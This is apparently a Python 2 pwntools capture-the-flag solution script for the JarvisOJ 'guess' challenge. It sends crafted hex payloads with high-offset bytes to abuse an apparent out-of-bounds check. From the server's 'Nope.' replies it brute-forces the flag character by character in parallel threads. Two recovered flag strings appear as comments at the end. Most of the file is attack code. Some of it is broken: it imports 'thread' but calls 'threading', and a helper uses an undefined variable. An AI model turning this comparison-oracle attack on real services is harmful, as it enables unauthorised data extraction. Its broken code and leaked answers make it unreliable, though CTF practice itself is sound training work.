# -*- coding: utf-8 -*-

from pwn import *
import thread
#context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
#中文注释
def e(n):
	return b.encode('hex')

flag = ['*']*50
bin = ELF('./guess')

def pwn(leak):
	global flag

	rr=1
	if rr:
		cn = remote('pwn.jarvisoj.com', 9878)
	else:
		cn = remote('127.0.0.1',9999)


	cn.recv()

	raw_pay=''
	for i in range(50):
		raw_pay += '0'
		raw_pay += chr(0x40+128+i)

	for ch in range(128):
		if chr(ch).isalnum() or chr(ch) == '{' or chr(ch) == '}':
			pay = list(raw_pay)
			pay[2*leak] = chr(ch).encode('hex')[0]
			pay[2*leak+1] = chr(ch).encode('hex')[1]
			pay = ''.join(pay)
			cn.sendline(pay)
			ret = cn.recvline()
			cn.recv()
			if ret != 'Nope.\n':
				flag[leak] = chr(ch)
				print chr(ch),
				break
	cn.close()

t=[0]*50
for i in range(50):
	t[i] = threading.Thread(target=pwn,args=(i,))
	t[i].start()

for i in range(50):
	t[i].join()


print "\n\nfind flag:" + ''.join(flag)

#PCTF{49d4310a1085875567932651e50000530fc8bd27b431}
#PCTF{49d4310a1085875567932651e559e153cfc8bd27b431}